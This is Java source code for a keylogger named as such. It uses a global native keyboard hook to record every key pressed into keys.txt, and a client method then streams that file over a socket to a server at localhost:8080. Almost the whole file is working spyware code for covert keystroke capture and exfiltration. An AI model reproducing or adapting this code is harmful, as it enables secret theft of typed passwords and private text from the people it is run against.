/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 */

package com.mycompany.keylogger;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import java.io.BufferedWriter;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.time.LocalDate;
import java.time.LocalDateTime;
import java.util.Date;


/**
 *
 * @author zx-0b111
 */
public class Keylogger implements NativeKeyListener {
   
    static String formatacao = " \n"+ "KEY PRESSED: ";
    static File file = new File("keys.txt");
    
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
         String capturar =  "  " + NativeKeyEvent.getKeyText(e.getKeyCode());
         System.out.println(capturar);
       
        try {
              PrintWriter saida = new PrintWriter(new FileWriter(file, true), true); //Para escrever tudo no mesmo arquivo sem alterar
              saida.write(formatacao);
              saida.write(capturar);
              saida.close();   
            
            } catch (IOException eee) {
                System.out.println("Deu ruim " + eee.getMessage());
            }
    }
    
    public static void Cliente() {
        try (Socket client = new Socket("localhost", 8080)) {
            
             int bytes = 0;
             File caminho = new File("keys.txt");
             DataInputStream acessa_bytes = new DataInputStream(client.getInputStream());
             DataOutputStream escreve_bytes = new DataOutputStream(client.getOutputStream());
             
             FileInputStream lendo_arquivo = new FileInputStream(caminho);
             
             escreve_bytes.writeLong(caminho.length());
             
             byte[] dividindo_arquivo = new byte[4*1024]; //dividindo o arquivo em pedaços de 4096 bytes.
             
             while((bytes=lendo_arquivo.read(dividindo_arquivo)) != -1) {
                 escreve_bytes.write(dividindo_arquivo, 0, bytes); //acessa a matriz com os bytes escritos do arquivo, posição da matriz do buffer que vai ser iniciada e lida, posição do números de bytes a serem lidos e escritos. Começando da posição 0, ou seja, o primeiro byte a ser acessado.
                 escreve_bytes.flush(); //limpa resquício de memória.
             }
             lendo_arquivo.close(); //fecha leitor dos bytes do arquivo.
             
             acessa_bytes.close();
             client.close();
             
            } catch (IOException kkkk) {
            System.out.println("Deu ruim " + kkkk.getMessage());
        }
    }
    
    public static void main(String[] args) {
		try {
                    GlobalScreen.registerNativeHook();
                    GlobalScreen.addNativeKeyListener(new Keylogger());
                    Cliente();
                   
                }
		catch (NativeHookException ex) {
			System.err.println("Ocorreu um problema e não conseguimos registrar as teclas");
			System.err.println(ex.getMessage());

			System.exit(1);
		}
                
        }
}